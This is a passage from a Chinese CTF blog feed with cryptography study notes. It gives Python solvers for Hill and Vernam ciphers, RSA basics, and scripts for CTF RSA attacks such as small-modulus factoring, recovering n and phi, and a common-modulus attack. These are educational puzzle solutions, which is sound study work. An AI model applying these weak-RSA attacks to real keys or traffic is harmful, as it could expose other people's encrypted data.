array(get)</span><br><span class="line"></span><br><span class="line">string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> get:</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line"></span><br><span class="line">one = int(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> one &lt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">one = one + <span class="number">26</span></span><br><span class="line"></span><br><span class="line">one = one + <span class="number">96</span></span><br><span class="line"></span><br><span class="line">string = string + chr(one)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;The final result is:\n&#x27;</span> + string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">start = Start()</span><br><span class="line"></span><br><span class="line">key,result,judge = Deal(start)</span><br><span class="line"></span><br><span class="line">Exploit(key,result,judge)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>总结：</p><p>1.在转换逆矩阵的时候，如果出现了分数或者小数。我们需要将逆矩阵乘以27和d(给我们的矩阵的行列式)的最小公倍数。</p><p>2.加密矩阵如果是 2 × 2 的方阵，明文就要每两个为列，组成 2 × n 的矩阵。</p><h2 id="德军密码-费娜姆密码"><a href="#德军密码-费娜姆密码" class="headerlink" title="德军密码([费娜姆密码])"></a>德军密码([<strong>费娜姆密码</strong>])</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">EnCODE &#x3D;&#123;&#39;A&#39;:&#39;1000001&#39; ,&#39;N&#39;:&#39;1001110&#39;,</span><br><span class="line">        &#39;B&#39;: &#39;1000010&#39;, &#39;O&#39; :&#39;1001111&#39;,</span><br><span class="line">        &#39;C&#39;: &#39;1000011&#39;, &#39;P&#39; :&#39;1010000&#39;,</span><br><span class="line">        &#39;D&#39;: &#39;1000100&#39;, &#39;Q&#39; :&#39;1010001&#39;,</span><br><span class="line">        &#39;E&#39;: &#39;1000101&#39;, &#39;R&#39; :&#39;1010010&#39;,</span><br><span class="line">        &#39;F&#39;: &#39;1000110&#39;, &#39;S&#39; :&#39;1010011&#39;,</span><br><span class="line">        &#39;G&#39;: &#39;1000111&#39;, &#39;T&#39; :&#39;1010100&#39;,</span><br><span class="line">        &#39;H&#39;: &#39;1001000&#39;, &#39;U&#39; :&#39;1010101&#39;,</span><br><span class="line">        &#39;I&#39;: &#39;1001001&#39;, &#39;V&#39; :&#39;1010110&#39;,</span><br><span class="line">        &#39;J&#39;: &#39;1001010&#39;, &#39;W&#39; :&#39;1010111&#39;,</span><br><span class="line">        &#39;K&#39;: &#39;1001011&#39; ,&#39;X&#39; :&#39;1011000&#39;,</span><br><span class="line">        &#39;L&#39;: &#39;1001100&#39; ,&#39;Y&#39; :&#39;1011001&#39;,</span><br><span class="line">        &#39;M&#39;: &#39;1001101&#39; ,&#39;Z&#39; :&#39;1011010&#39;</span><br><span class="line">&#125;</span><br><span class="line">DeCODE&#x3D;&#123;</span><br><span class="line">        &#39;1000001&#39;:&#39;A&#39;,  &#39;1001110&#39;:&#39;N&#39;,</span><br><span class="line">        &#39;1000010&#39;:&#39;B&#39;,  &#39;1001111&#39;:&#39;O&#39;,</span><br><span class="line">        &#39;1000011&#39;:&#39;C&#39;,  &#39;1010000&#39;:&#39;P&#39;,</span><br><span class="line">        &#39;1000100&#39;:&#39;D&#39;,  &#39;1010001&#39;:&#39;Q&#39;,</span><br><span class="line">        &#39;1000101&#39;:&#39;E&#39;,  &#39;1010010&#39;:&#39;R&#39;,</span><br><span class="line">        &#39;1000110&#39;:&#39;F&#39;,  &#39;1010011&#39;:&#39;S&#39;,</span><br><span class="line">        &#39;1000111&#39;:&#39;G&#39;,  &#39;1010100&#39;:&#39;T&#39;,</span><br><span class="line">        &#39;1001000&#39;:&#39;H&#39;,  &#39;1010101&#39;:&#39;U&#39;,</span><br><span class="line">        &#39;1001001&#39;:&#39;I&#39;,  &#39;1010110&#39;:&#39;V&#39;,</span><br><span class="line">        &#39;1001010&#39;:&#39;J&#39;,  &#39;1010111&#39;:&#39;W&#39;,</span><br><span class="line">        &#39;1001011&#39;:&#39;K&#39;,  &#39;1011000&#39;:&#39;X&#39;,</span><br><span class="line">        &#39;1001100&#39;:&#39;L&#39;,  &#39;1011001&#39;:&#39;Y&#39;,</span><br><span class="line">        &#39;1001101&#39;:&#39;M&#39;,  &#39;1011010&#39;:&#39;Z&#39;</span><br><span class="line">&#125;</span><br><span class="line">steady_str&#x3D;&quot;00000100001000001101000001100001010&quot;</span><br><span class="line">steady_key&#x3D;&quot;large&quot;.upper()</span><br><span class="line">steady_new_key&#x3D;&quot;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in steady_key:</span><br><span class="line">steady_new_key+&#x3D;EnCODE[i]</span><br><span class="line">for j in range(0,len(steady_str),7):</span><br><span class="line">inting&#x3D;&quot;&quot;</span><br><span class="line">string&#x3D;str(steady_str[j:j+7])</span><br><span class="line">string1&#x3D;str(steady_new_key[j:j+7])</span><br><span class="line">for z in range(7):</span><br><span class="line">inting+&#x3D;str(int(string[z])^int(string1[z]))</span><br><span class="line">try:</span><br><span class="line">flag+&#x3D;DeCODE[inting]</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#费纳姆密码解密脚本</span><br><span class="line">cipher &#x3D; input(&quot;请输入密文：&quot;)</span><br><span class="line">key &#x3D; input(&quot;请输入密钥：&quot;)</span><br><span class="line">miyao &#x3D; &quot;&quot;</span><br><span class="line">flag1 &#x3D; &quot;&quot;</span><br><span class="line">final &#x3D; &quot;&quot;</span><br><span class="line">for i in key:</span><br><span class="line">    miyao +&#x3D; (str(bin(ord(i)))[2:])</span><br><span class="line">print(miyao)</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">    flag1 +&#x3D; str(int(cipher[i])^int(miyao[i]))</span><br><span class="line">#flag七个一组进行分割</span><br><span class="line">print(cipher)</span><br><span class="line">step &#x3D; 7</span><br><span class="line">b &#x3D; [flag1[i:i+step] for i in range(0,len(flag1),step)]</span><br><span class="line">flag &#x3D; []</span><br><span class="line">for i in b:</span><br><span class="line">flag.append(i)</span><br><span class="line">for i in flag:</span><br><span class="line">    final +&#x3D; chr(int(i,2))</span><br><span class="line">print(&quot;flag为：&quot;+final)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF密码题总结&quot;&gt;&lt;a href=&quot;#CTF密码题总结&quot; class=&quot;headerlink&quot; title=&quot;CTF密码题总结&quot;&gt;&lt;/a&gt;CTF密码题总结&lt;/h1&gt;&lt;h2 id=&quot;Base64&quot;&gt;&lt;a href=&quot;#Base64&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>CTF-RSA</title>
    <link href="http://s1eady.top/2018/11/08/CTF-RSA/"/>
    <id>http://s1eady.top/2018/11/08/CTF-RSA/</id>
    <published>2018-11-07T19:28:56.000Z</published>
    <updated>2020-10-16T11:43:16.863Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-RSA"><a href="#CTF-RSA" class="headerlink" title="CTF-RSA"></a>CTF-RSA</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="什么是”素数”"><a href="#什么是”素数”" class="headerlink" title="什么是”素数”"></a>什么是”素数”</h3><p>不能表示为其它任何两个整数的乘积(除了1或者本身)，比如13只能是13*1=13，3*5=15，15就不是质数。</p><h3 id="什么是”互质数”"><a href="#什么是”互质数”" class="headerlink" title="什么是”互质数”"></a>什么是”互质数”</h3><p>公约数只有1的两个数，叫做互质数。</p><h3 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 mod 3&#x3D;1；26 mod 6&#x3D;2；28 mod 2 &#x3D;0</span><br></pre></td></tr></table></figure><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><h4 id="什么是欧拉函数"><a href="#什么是欧拉函数" class="headerlink" title="什么是欧拉函数"></a>什么是欧拉函数</h4><p>欧拉函数是小于x的整数中与x互素的数的个数，一般用φ(x)表示。特殊的，φ(1)=1。</p><h4 id="如何计算欧拉函数"><a href="#如何计算欧拉函数" class="headerlink" title="如何计算欧拉函数"></a>如何计算欧拉函数</h4><p>通式：<code>φ(n)=n*(1-1/p1)*(1-1/p2)*(1-1/p3)*(1-1/p4)*…*(1-1/pn)</code>,其中<code>p1, p2……pn</code>为n的所有素因数，n是不为0的整数。</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>欧拉定理是指：如果两个正整数a和n互素，则n的欧拉函数φ(n)可以让下面的式子成立：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1249281-20190928135512953-1986238612.png" alt="img"></p><p>即a的φ(n)次方减去1，可以被n整除. 比如，3和4互质，φ(4)=2，(3^2-1)/4=2. 当a为正整数，n为素数且a不能被n整除时，则有a^(n-1) ≡ 1 (mod n)这就是费马小定理.</p><h3 id="RSA加密算法"><a href="#RSA加密算法" class="headerlink" title="RSA加密算法"></a>RSA加密算法</h3><h4 id="密钥的生成过程"><a href="#密钥的生成过程" class="headerlink" title="密钥的生成过程"></a>密钥的生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 随意选择两个大的素数p和q，p不等于q，计算n &#x3D; pq.</span><br><span class="line">2. 根据欧拉函数的性质3，求得r&#x3D;φ(n)&#x3D;φ(p)φ(q)&#x3D;(p-1)(q-1).</span><br><span class="line">3. 选择一个小于r的整数e,且e与r互素；并求得e关于r的模反元素，命名为d.(模反元素存在，当且仅当e与r互质; 求d令ed≡1(mod r)）</span><br><span class="line">4. 将p和q的记录销毁</span><br></pre></td></tr></table></figure><p>(n，e)是公钥，(n，d)是私钥. 例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. A随机选两个不相等的质数61和53，并计算两数的积n&#x3D;61*53&#x3D;3233，n的长度就是密钥长度。3233的二进制是110010100001，一共12位， </span><br><span class="line">所以这个密钥就是12位. 实际应用中，RSA密钥一般是1024位，重要的场合是2048位.</span><br><span class="line">2. 计算n的欧拉函数; φ(n)&#x3D;(p-1)(q-1)&#x3D;60*52&#x3D;3120.</span><br><span class="line">3. A在1到3120上随机选择了一个随机数e&#x3D;17，与3120互素.</span><br><span class="line">4. 计算e对φ(n)的模反元素d，即时，ed-1&#x3D;kφ(n)。</span><br><span class="line">   即使求解：17x+3120y&#x3D;1.用扩展欧几里得算法求解。可以算出一组解(x,y)&#x3D;(2753,-15)，即d&#x3D;2753. 公钥(3233, 17)，私钥(3233,2753)</span><br></pre></td></tr></table></figure><h4 id="加解密过程"><a href="#加解密过程" class="headerlink" title="加解密过程"></a>加解密过程</h4><p>明文：<code>m</code></p><p>密文：<code>c</code> </p><p>两个数：<code>p、q</code><br>n：<code>q×p</code><br>f(n)：<code>(p-1)×(q-1)</code><br>e：<code>与f(n)互为质数</code><br>d：<code>e×d=1 mod f(n)</code></p><h5 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h5><p>公钥加密—-(n,e)—-(33,3)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;m^e%N</span><br></pre></td></tr></table></figure><h5 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;c^d%N</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选择两个大素数p和q，计算出模数N &#x3D; p * q</span><br><span class="line">计算φ &#x3D; (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质</span><br><span class="line">取e的模反数为d，计算方法: e * d ≡ 1 (mod φ)</span><br><span class="line">对明文m进行加密：c &#x3D; pow(m, e, N)，得到的c即为密文</span><br><span class="line">对密文c进行解密，m &#x3D; pow(c, d, N)，得到的m即为明文</span><br></pre></td></tr></table></figure><h3 id="Python与RSA"><a href="#Python与RSA" class="headerlink" title="Python与RSA"></a>Python与RSA</h3><p>求p、q</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N&#x3D;30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511</span><br><span class="line">q&#x3D;57970027</span><br><span class="line">print(N&#x2F;&#x2F;q)</span><br></pre></td></tr></table></figure><p>分解N</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 920139713</span><br><span class="line">for i in range(2, N):</span><br><span class="line">    if N % i &#x3D;&#x3D; 0:</span><br><span class="line">        print (i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python2</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line">N=<span class="number">322831561921859</span></span><br><span class="line">factor=FactorDB(N)</span><br><span class="line">factor.connect()</span><br><span class="line">factor_list=factor.get_factor_list()</span><br><span class="line">print(factor_list)</span><br></pre></td></tr></table></figure><p>求解D</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D &#x3D; gmpy2.invert(e,n) # 求逆元，de &#x3D; 1 mod n</span><br></pre></td></tr></table></figure><p>返回的D的类型为&lt;class ‘mpz’&gt;</p><p>欧几里得算法求D</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D&#x3D;gmpy2.gcd(a,b)</span><br></pre></td></tr></table></figure><p>求明文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;pow(int(c),d,n)</span><br></pre></td></tr></table></figure><p>其中d的类型是&lt;class ‘mpz’&gt;</p><p>初始化一个大整数x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.mpz(x)</span><br></pre></td></tr></table></figure><p>libnum库</p><p>libnum.s2n(s)：字符串转换为数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">s &#x3D; &quot;ab12&quot;</span><br><span class="line">print(libnum.s2n(s))</span><br><span class="line"></span><br><span class="line">result: 1633825074</span><br></pre></td></tr></table></figure><p>libnum.s2n(n)：数字转换为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n &#x3D; 1633825074</span><br><span class="line">print(libnum.n2s(n))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure><p>libnum.s2b(s)：字符串转换为二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">s &#x3D; &quot;ab12&quot;</span><br><span class="line">print(libnum.s2b(s))</span><br><span class="line"></span><br><span class="line">result: 01100001011000100011000100110010</span><br></pre></td></tr></table></figure><p>libnum.b2s(b)：二进制字符串转换为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">b &#x3D; &quot;01100001011000100011000100110010&quot;</span><br><span class="line">print(libnum.b2s(b))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure><p>求d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line">p = <span class="number">3487583947589437589237958723892346254777</span>  </span><br><span class="line">q = <span class="number">8767867843568934765983476584376578389</span>  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)       </span><br><span class="line">d = gmpy2.invert(e,phi) </span><br><span class="line"><span class="keyword">print</span> d </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">p = <span class="number">3487583947589437589237958723892346254777</span>  </span><br><span class="line">q = <span class="number">8767867843568934765983476584376578389</span>  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi) </span><br><span class="line"><span class="keyword">print</span> d  </span><br></pre></td></tr></table></figure><h3 id="CTF-中的RSA"><a href="#CTF-中的RSA" class="headerlink" title="CTF-中的RSA"></a>CTF-中的RSA</h3><p>总体思路就是获取秘文然后根据给的条件解密。</p><h4 id="爆破因子"><a href="#爆破因子" class="headerlink" title="爆破因子"></a>爆破因子</h4><p>模数N过小时，我们可以写个脚本直接爆破他的因子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 920139713</span><br><span class="line">for i in range(2, N):</span><br><span class="line">    if N % i &#x3D;&#x3D; 0:</span><br><span class="line">        print (i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">q=<span class="number">18443</span></span><br><span class="line">p=<span class="number">49891</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">f=open(<span class="string">&#x27;/Users/apple/Desktop/1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    m=pow(int(i),d,n)</span><br><span class="line">    flag+=chr(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="求N、P、Q"><a href="#求N、P、Q" class="headerlink" title="求N、P、Q"></a>求N、P、Q</h4><p>前提：</p><p>题目给出了p+q,(p+1)(q+1),e,d,c。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(p+<span class="number">1</span>)(q+<span class="number">1</span>)=p*q+p+q+<span class="number">1</span>=n+(p+q)+<span class="number">1</span>=x</span><br><span class="line">n=x-(p+q+<span class="number">1</span>)</span><br><span class="line">y=(q+p+<span class="number">1</span>)</span><br><span class="line">n=x-y</span><br><span class="line">phi=(p<span class="number">-1</span>)(q<span class="number">-1</span>)</span><br><span class="line">   =p*q-p-q+<span class="number">1</span></span><br><span class="line">   =p*q-(p+q)+<span class="number">1</span></span><br><span class="line">   =n-y+<span class="number">2</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">x = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span> + <span class="number">1</span>  </span><br><span class="line">y = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span>  </span><br><span class="line">c = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span>  </span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span>  </span><br><span class="line">n = y-x  </span><br><span class="line">phi = n-x+<span class="number">2</span>  </span><br><span class="line">d =gmpy2.invert(e,phi)  </span><br><span class="line">m = pow(c,d,n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h4 id="公共模数攻击"><a href="#公共模数攻击" class="headerlink" title="公共模数攻击"></a>公共模数攻击</h4><p>前提：</p><p>共模、知道公钥、未知D、gcd(e1,e2)==1</p><p>判断gcd(e1,e2)==1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a%b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"><span class="keyword">if</span> gcd(e1,e2)==<span class="number">1</span>:</span><br><span class="line">print(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c1 = libnum.s2n(open(<span class="string">&quot;./veryhardRSA/flag.enc1&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">c2 = libnum.s2n(open(<span class="string">&quot;./veryhardRSA/flag.enc2&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 